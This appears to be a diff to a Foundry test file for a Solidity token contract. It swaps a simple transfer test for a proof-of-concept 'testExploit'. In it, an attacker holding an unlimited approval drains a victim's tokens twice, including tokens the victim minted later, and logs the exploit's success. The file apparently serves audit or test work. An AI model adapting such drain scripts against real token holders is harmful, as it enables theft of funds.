@@ -7,25 +7,89 @@ import "forge-std/Test.sol";
 contract ContractTest is Test {
     GalacticToken tokenContract;
     address deployer = vm.addr(1);
-    address user = vm.addr(2);
+    address victim = vm.addr(2);
+    address attacker = vm.addr(3);
 
     function setUp() public {
         vm.prank(deployer);
         tokenContract = new GalacticToken();
+
+        // Initial setup
         vm.warp(block.timestamp + 1 hours);
         vm.prank(deployer);
         tokenContract.mint(5000);
+
+        // Give victim some tokens
+        vm.prank(deployer);
+        tokenContract.transfer(victim, 1000);
     }
 
-    function testTokenOperations() public {
-        vm.startPrank(deployer);
-        tokenContract.transfer(address(user), 2500);
-        vm.stopPrank();
-        assertEq(tokenContract.balanceOf(user), 2500, "Initial transfer failed");
-        console.log("Test environment initialized successfully");
-    }
+    function testExploit() public {
+        console.log("Victim initial balance:", tokenContract.balanceOf(victim));
+        console.log(
+            "Attacker initial balance:",
+            tokenContract.balanceOf(attacker)
+        );
 
-    receive() external payable {}
+        // Step 1: Victim approves attacker for a large amount
+        vm.prank(victim);
+        tokenContract.approve(attacker, type(uint256).max);
+
+        // Step 2: First drain - take initial balance
+        vm.prank(attacker);
+        tokenContract.transferFrom(victim, attacker, 1000);
+
+        console.log(
+            "Victim balance after first drain:",
+            tokenContract.balanceOf(victim)
+        );
+        console.log(
+            "Attacker balance after first drain:",
+            tokenContract.balanceOf(attacker)
+        );
+
+        // Step 3: Victim gets more tokens
+        vm.warp(block.timestamp + 1 hours);
+        vm.prank(victim);
+        tokenContract.mint(2000);
+
+        console.log(
+            "Victim balance after mint:",
+            tokenContract.balanceOf(victim)
+        );
+
+        // Step 4: Attacker drains new tokens without new approval
+        vm.prank(attacker);
+        tokenContract.transferFrom(victim, attacker, 2000);
+
+        console.log(
+            "Victim balance after second drain:",
+            tokenContract.balanceOf(victim)
+        );
+        console.log(
+            "Attacker balance after second drain:",
+            tokenContract.balanceOf(attacker)
+        );
+
+        // Verify exploit success
+        assertEq(
+            tokenContract.balanceOf(victim),
+            0,
+            "Victim should have 0 balance"
+        );
+        assertEq(
+            tokenContract.balanceOf(attacker),
+            3000,
+            "Attacker should have all tokens"
+        );
+
+        console.log("Exploit successful - Attacker drained all victim tokens!");
+        console.log("Victim final balance:", tokenContract.balanceOf(victim));
+        console.log(
+            "Attacker final balance:",
+            tokenContract.balanceOf(attacker)
+        );
+    }
 }
 
 interface IERC20 {
